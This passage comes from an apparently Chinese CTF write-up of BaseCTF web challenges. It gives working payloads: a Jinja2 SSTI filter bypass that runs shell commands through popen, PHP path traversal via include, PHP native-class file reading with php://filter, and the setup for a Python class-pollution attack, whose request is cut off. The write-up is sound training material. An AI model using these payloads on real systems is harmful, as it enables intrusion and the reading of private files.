href="#题解-14" class="headerlink" title="题解"></a>题解</h3><p>​简单fuzz测试一下，发现过滤了<code>&#39;class&#39;, &#39;base&#39;, &#39;mro&#39;, &#39;init&#39;, &#39;global&#39;, &#39;builtin&#39;, &#39;config&#39;, &#39;request&#39;, &#39;lipsum&#39;, &#39;cycler&#39;, &#39;url_for&#39;, &#39;os&#39;, &#39;pop&#39;, &#39;format&#39;, &#39;replace&#39;, &#39;reverse&#39;,&#39;&#123;&#123;', '&#125;&#125;&#39;, &#39;__&#39;, &#39;.&#39;, &#39;*&#39;, &#39;+&#39;, &#39;-&#39;, &#39;/&#39;, &#39;&quot;&#39;, &#39;:&#39;, &#39;\&#39;</code>，并且需要是<code>BaseCTF</code>开头</p><p>​<code>&#123;&#123;`和`&#125;&#125;</code>被过滤了，使用<code>&#123;%`和`%&#125;</code>代替，但由于<code>&#123;%%&#125;</code>没有输入，因此需要搭配<code>print()</code>使用，即<code>&#123;%print(''.__class__)%&#125;</code>获取类对象，<code>.</code>过滤了可以使用<code>[]</code>代替，<code>class</code>代替可以用拼接绕过，修改payload为<code>&#123;%print(''['_'+'_cla'+'ss_'+'_'])%&#125;</code></p><p>​以下先不进行绕过操作，使用原始payload</p><ul><li><p>获取字符串的类对象<code>&#123;%print(''.__class__)%&#125;</code></p></li><li><p>寻找基类<code>&#123;%print(''.__class__.__mro__)%&#125;</code></p></li><li><p>寻找可用引用<code>&#123;%print(''.__class__.__mro__[0].__subclasses__())%&#125;</code></p><p>​<code>&#123;%print(''.__class__.__mro__[1].__subclasses__())%&#125;</code></p><p>在<code>&#123;%print(''.__class__.__mro__[0].__subclasses__()[104])%&#125;</code>找到<code>_frozen_importlib_Builtinlmporter</code>模块</p><p>payload为<code>&#123;%print(''.__class__.__base__.__subclasses__()[104]['load_module']('os')['popen']('cat /flag').read())%&#125;</code></p></li></ul><p>由于<code>/</code>和<code>.</code>被过滤，使得难以访问到根目录，linux中有一个dirname命令可以获取到父目录名称，通过与pwd组合，便可获得指向上一级目录，即<code>$(dirname $(pwd))</code>，因此，执行命令为<code>cd $(dirname $(pwd));cat flag</code></p><p>综上，原始payload为<code>&#123;%print(''.__class__.__base__.__subclasses__()[104]['load_module']('os')['popen']('cd $(dirname $(pwd));cat flag').read())%&#125;</code></p><p>​绕过过滤的最终payload为</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=BaseCTF&#123;%print(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_cla&#x27;</span>+<span class="string">&#x27;ss_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_m&#x27;</span>+<span class="string">&#x27;ro&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>][1][<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;_subc&#x27;</span>+<span class="string">&#x27;lasses_&#x27;</span>+<span class="string">&#x27;_&#x27;</span>]()&quot;[104][<span class="string">&#x27;load_module&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>)[<span class="string">&#x27;po&#x27;</span>+<span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd $(dirname $(pwd));cat flag&#x27;</span>)[<span class="string">&#x27;read&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><h2 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h2><h3 id="题目描述-15"><a href="#题目描述-15" class="headerlink" title="题目描述"></a>题目描述</h3><p>​过滤这么多还怎么玩！等等….不对劲</p><h3 id="考点-15"><a href="#考点-15" class="headerlink" title="考点"></a>考点</h3><ul><li><p>文件包含</p></li><li><p>目录遍历</p></li></ul><h3 id="题解-15"><a href="#题解-15" class="headerlink" title="题解"></a>题解</h3><p>题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​存在<code>include()</code>函数，显然是文件包含漏洞，但是过滤了伪协议</p><p>​先POST传入<code>incompetent=HelloWorld</code>绕过第一次判断</p><p>​foreach循环要求<code>$Datch</code>前几位和<code>$required_chars</code>一样，传入<code>Datch=sevanxro</code>即可</p><p>​结合目录遍历漏洞，使得include包含<code>sevanxro/../../../../../flag</code></p><p>​综合下来，POST传入<code>incompetent=HelloWorld&amp;Datch=sevanxro/../../../../../flag</code></p><h2 id="玩原神玩的"><a href="#玩原神玩的" class="headerlink" title="玩原神玩的"></a>玩原神玩的</h2><h3 id="题目描述-16"><a href="#题目描述-16" class="headerlink" title="题目描述"></a>题目描述</h3><p>​flag怎么被分解成$array了，不管了，原神，启动！</p><h3 id="考点-16"><a href="#考点-16" class="headerlink" title="考点"></a>考点</h3><ul><li>代码审计</li><li>数组传参</li></ul><h3 id="题解-16"><a href="#题解-16" class="headerlink" title="题解"></a>题解</h3><p>​题面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;len&#x27;</span>]) == <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>)) &#123;</span><br><span class="line">  <span class="title function_ invoke__">ys_open</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;tip&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;错了！就你还想玩原神？❌❌❌&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ys_open</span>(<span class="params"><span class="variable">$tip</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$tip</span> != <span class="string">&quot;我要玩原神&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;我不管，我要玩原神！😭😭😭&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_ invoke__">dumpFlag</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dumpFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) || <span class="title function_ invoke__">sizeof</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>]) != <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;可恶的QQ人！😡😡😡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">0</span>];</span><br><span class="line">  <span class="variable">$b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>][<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$a</span>) || <span class="keyword">empty</span>(<span class="variable">$b</span>) || <span class="variable">$a</span> != <span class="string">&quot;100%&quot;</span> || <span class="variable">$b</span> != <span class="string">&quot;love100%&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;某站崩了？肯定是某忽悠干的！😡😡😡&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">  <span class="variable">$flag</span>[] = <span class="keyword">array</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="variable">$ii</span> = <span class="number">0</span>;<span class="variable">$ii</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$array</span>);<span class="variable">$ii</span>++) &#123;</span><br><span class="line">    <span class="variable">$flag</span>[<span class="variable">$ii</span>] = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$array</span>[<span class="variable">$ii</span>]) ^ <span class="variable">$ii</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​第一步要求<code>sizeof($_POST[&#39;len&#39;]) == sizeof($array)</code>，<code>$array</code>的值不知道，结合<code>include &#39;flag.php&#39;;</code>，推测是flag，flag的长度我们并不知道，所以需要写脚本进行测试，需要注意的是，如果传入<code>len[0]=1&amp;len[1]=1</code>，则<code>sizeof($_POST[&#39;len&#39;])==2</code>，同理传入<code>len[0]=1&amp;len[1]=1&amp;len[2]=1</code>，则<code>sizeof($_POST[&#39;len&#39;])==3</code>，最终测试得到<code>sizeof($array)==45</code></p><p>​第二步传入<code>tip=我要玩原神</code>即可，可能需要url编码一下</p><p>​第三步传入<code>m[0]=1&amp;m[1]=1</code></p><p>​第四步修改<code>m[0]=100%</code>，求出<code>md5(&quot;100%&quot;)==30bd7ce7de206924302499f197c7a966</code>，修改<code>m[1]=love100%30bd7ce7de206924302499f197c7a966</code></p><p>​然后会得到45个flag的字符的ascii值异或上它的下标的md5值</p><p>​编写脚本先把md5转化回flag的字符的ascii值异或上它的下标的值</p><p>​再将得到的值异或它的对应下标后再转字符即可</p><p>​以下完整脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_md5</span>():</span><br><span class="line">    url = <span class="string">&quot;http://challenge.basectf.fun:23409/?tip=我要玩原神&quot;</span></span><br><span class="line">    post_data = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">45</span>): <span class="comment"># sizeof($array)==45</span></span><br><span class="line">        post_data[<span class="string">f&quot;len[<span class="subst">&#123;<span class="built_in">str</span>(i)&#125;</span>]&quot;</span>] = <span class="built_in">str</span>(i)</span><br><span class="line"></span><br><span class="line">    post_data[<span class="string">&quot;m[0]&quot;</span>] = <span class="string">&quot;100%&quot;</span></span><br><span class="line">    post_data[<span class="string">&quot;m[1]&quot;</span>] = <span class="string">&quot;love100%30bd7ce7de206924302499f197c7a966&quot;</span></span><br><span class="line"></span><br><span class="line">    response = requests.post(url, data=post_data).text[<span class="number">5913</span>::]</span><br><span class="line">    datas = json.loads(response)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;md5.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">            fp.write(data+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> datas</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>(<span class="params">datas</span>):  <span class="comment"># MD5列表转flag</span></span><br><span class="line">    md5_flag = []</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;md5_table.json&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        md5_table = json.load(fp)</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        md5_flag.append(md5_table[data])</span><br><span class="line">    <span class="built_in">print</span>(md5_flag)</span><br><span class="line">    <span class="keyword">for</span> index, ch <span class="keyword">in</span> <span class="built_in">enumerate</span>(md5_flag):</span><br><span class="line">        ch = <span class="built_in">chr</span>(<span class="built_in">int</span>(ch) ^ index)</span><br><span class="line">        flag += ch</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(get_flag(get_md5()))</span><br></pre></td></tr></table></figure><p>​生成md5_table.json（md5彩虹表）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">md5_list = []</span><br><span class="line">md5_table = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):  <span class="comment"># 1到1000的数字</span></span><br><span class="line">    md5_list.append(<span class="built_in">str</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">126</span>):  <span class="comment"># 特殊字符及字母</span></span><br><span class="line">    md5_list.append(<span class="built_in">chr</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(md5_list)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md5_list:</span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(i.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(md5.hexdigest())</span><br><span class="line">    md5_table[md5.hexdigest()] = i  <span class="comment"># 形如&#123;&quot;md5值&quot;:&quot;原字符&quot;&#125;的字典</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;md5_table.json&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    json.dump(md5_table, fp)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h1 id="Week4"><a href="#Week4" class="headerlink" title="Week4"></a>Week4</h1><h2 id="flag直接读取不就行了？"><a href="#flag直接读取不就行了？" class="headerlink" title="flag直接读取不就行了？"></a>flag直接读取不就行了？</h2><h3 id="题目描述-17"><a href="#题目描述-17" class="headerlink" title="题目描述"></a>题目描述</h3><p>​你应该能找到flag吧？</p><h3 id="考点-17"><a href="#考点-17" class="headerlink" title="考点"></a>考点</h3><ul><li><p>php原生类</p></li><li><p>php伪协议</p></li></ul><h3 id="题解-17"><a href="#题解-17" class="headerlink" title="题解"></a>题解</h3><p>​查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$J1ng</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;J&#x27;</span>];</span><br><span class="line"><span class="variable">$Hong</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;H&#x27;</span>];</span><br><span class="line"><span class="variable">$Keng</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;K&#x27;</span>];</span><br><span class="line"><span class="variable">$Wang</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;W&#x27;</span>];</span><br><span class="line"><span class="variable">$dir</span> = <span class="keyword">new</span> <span class="variable">$Keng</span>(<span class="variable">$Wang</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$dir</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$J1ng</span>(<span class="variable">$Hong</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>​第9行利用遍历文件目录的类，结合10-12行遍历并输出文件找到flag文件的位置和名字</p><p>​第13行利用文件读取的类读取flag文件</p><p>​先GET传参<code>?K=DirectoryIterator&amp;W=/secret</code>获取flag名字为<code>f11444g.php</code></p><p>​因为是php文件，直接读取会被包含而看不到其中信息，因此需要结合php伪协议</p><p>​再POST传参<code>J=SplFileObject&amp;H=php://filter/convert.base64-encode/resource=/secret/f11444g.php</code></p><p>​获得被base64编码后的flag文件</p><h2 id="圣钥之战1-0"><a href="#圣钥之战1-0" class="headerlink" title="圣钥之战1.0"></a>圣钥之战1.0</h2><h3 id="题目描述-18"><a href="#题目描述-18" class="headerlink" title="题目描述"></a>题目描述</h3><p>​J1ngHong大魔王不会让你污染圣钥的！</p><h3 id="考点-18"><a href="#考点-18" class="headerlink" title="考点"></a>考点</h3><ul><li>原型链污染</li></ul><h3 id="题解-18"><a href="#题解-18" class="headerlink" title="题解"></a>题解</h3><p>​访问&#x2F;read路由获取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_json</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        json.loads(data)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">cls</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">instance = cls()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/static/index.html&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Read</span>():</span><br><span class="line">    file = <span class="built_in">open</span>(__file__, encoding=<span class="string">&quot;utf-8&quot;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> <span class="string">f&quot;J1ngHong说：你想read flag吗？</span></span><br><span class="line"><span class="string">那么圣钥之光必将阻止你！</span></span><br><span class="line"><span class="string">但是小小的源码没事，因为你也读不到flag(乐)</span></span><br><span class="line"><span class="string"><span class="subst">&#123;file&#125;</span></span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/pollute&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Pollution</span>():</span><br><span class="line">    <span class="keyword">if</span> request.is_json:</span><br><span class="line">        merge(json.loads(request.data),instance)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：钥匙圣洁无暇，无人可以污染！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><p>​可以利用<code>Read()</code>下的<code>open().read()</code>来读取flag，因此我们需要污染<code>__file__</code>的值为<code>/flag</code></p><p>​payload为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">GET /pollute HTTP/1.1</span><br><span 